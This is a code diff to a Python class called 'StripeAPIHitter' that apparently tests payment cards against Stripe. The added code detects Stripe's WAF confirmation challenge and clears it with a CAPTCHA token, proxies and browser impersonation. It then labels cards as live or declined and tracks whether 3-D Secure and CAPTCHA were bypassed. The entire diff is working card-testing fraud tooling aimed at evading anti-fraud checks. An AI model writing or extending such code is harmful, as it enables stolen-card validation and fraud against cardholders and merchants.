@@ -1789,12 +1789,87 @@ class StripeAPIHitter:
                                         _top_sitekey = _ls.get('hcaptcha_site_key')
                                 # ────────────────────────────────────────────────────────────────────
 
+                                # ── WAF GATE DETECTION: intent_confirmation_challenge ────────────────
+                                # This is NOT 3DS. Stripe's WAF returns use_stripe_sdk.type == 
+                                # "intent_confirmation_challenge" with a verification_url that must be
+                                # POSTed to before Stripe will allow the PI to be confirmed/charged.
+                                # Without clearing this gate, we never reach the issuer.
+                                _sdk_type = sdk.get('type') or ''
+                                _is_waf_gate = (_sdk_type == 'intent_confirmation_challenge')
+                                _verify_challenge_url = None
+                                _waf_cleared = False
+                                if _is_waf_gate and stripe_js:
+                                    _raw_verify_path = stripe_js.get('verification_url') or ''
+                                    if _raw_verify_path:
+                                        _verify_challenge_url = (
+                                            f"https://api.stripe.com{_raw_verify_path}"
+                                            if _raw_verify_path.startswith('/') else _raw_verify_path
+                                        )
+                                    elif pi:
+                                        # fallback: construct from pi_id
+                                        _verify_challenge_url = f"https://api.stripe.com/v1/payment_intents/{pi}/verify_challenge"
+
+                                if _is_waf_gate and _verify_challenge_url and pi and client_secret:
+                                    try:
+                                        _verify_data = {
+                                            "key": self.pk_live,
+                                            "client_secret": client_secret,
+                                        }
+                                        if _hcaptcha_token:
+                                            _verify_data["captcha_response"] = _hcaptcha_token
+                                        _verify_headers = headers.copy()
+                                        _verify_headers["Idempotency-Key"] = str(uuid.uuid4())
+                                        _verify_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                            _verify_challenge_url, headers=_verify_headers, data=_verify_data,
+                                            proxies=proxies, timeout=20, impersonate=profile["impersonate"]))
+                                        _verify_json = _verify_res.json() if _verify_res else {}
+                                        _vpi = _verify_json.get('payment_intent') or _verify_json.get('setup_intent') or _verify_json
+                                        _vstat = _vpi.get('status') if isinstance(_vpi, dict) else None
+                                        print(f"[DEBUG WAF VERIFY] status={_vstat} url={_verify_challenge_url}")
+                                        if _vstat in ['succeeded', 'requires_capture', 'complete']:
+                                            result['success'] = True
+                                            result['is_live'] = True
+                                            receipt_url = find_receipt_url(_verify_json)
+                                            if receipt_url:
+                                                result['receipt_url'] = receipt_url
+                                            return result
+                                        elif _vstat in ['requires_action', 'requires_source_action']:
+                                            # Gate cleared — update PI state, fall through to 3DS matrix
+                                            _waf_cleared = True
+                                            _vnext = (isinstance(_vpi, dict) and _vpi.get('next_action')) or {}
+                                            _vsdk = _vnext.get('use_stripe_sdk') or {}
+                                            _new_source = (
+                                                _vsdk.get('three_d_secure_2_source')
+                                                or _vsdk.get('source')
+                                                or _vnext.get('source')
+                                            )
+                                            if _new_source:
+                                                sdk = _vsdk
+                                                next_action = _vnext
+                                                res = _vpi
+                                                pi = _vpi.get('id') or pi
+                                                client_secret = _vpi.get('client_secret') or client_secret
+                                        elif _vstat == 'requires_payment_method':
+                                            # Issuer soft declined after challenge cleared
+                                            _verr = _vpi.get('last_payment_error') or {}
+                                            result['decline_code'] = _verr.get('decline_code') or _verr.get('code') or 'declined_after_waf'
+                                            result['error'] = _verr.get('message', 'Declined after WAF verification')
+                                            result['is_live'] = True
+                                            result['3ds_bypassed'] = False
+                                            result['3ds_type'] = 'waf_gate'
+                                            result['raw_response'] = _verify_json
+                                            return result
+                                    except Exception as _wex:
+                                        print(f"[DEBUG WAF VERIFY] exception: {_wex}")
+                                # ────────────────────────────────────────────────────────────────────
+
                                 source = (
                                     sdk.get("three_d_secure_2_source")
                                     or sdk.get("source")
                                     or sdk.get("_rq_source_override")
                                     or next_action.get("source")
                                 )
+
 
                                 # Execute app (3).py secondary PI/SETI confirm with client_secret on all requires_action responses
                                 if pi and client_secret:
@@ -2111,7 +2186,7 @@ class StripeAPIHitter:
                                         result['error'] = f"3ds_challenge_unresolved"
                                     result['is_live'] = True
                                     result['3ds_attempted'] = True
-                                    result['3ds_type'] = 'stripe_3ds2'
+                                    result['3ds_type'] = 'waf_challenge' if (_is_waf_gate and not _waf_cleared) else 'stripe_3ds2'
                                     result['captcha_bypassed'] = bool(_hcaptcha_token)
                                     result['raw_response'] = poll_json
                                     return result
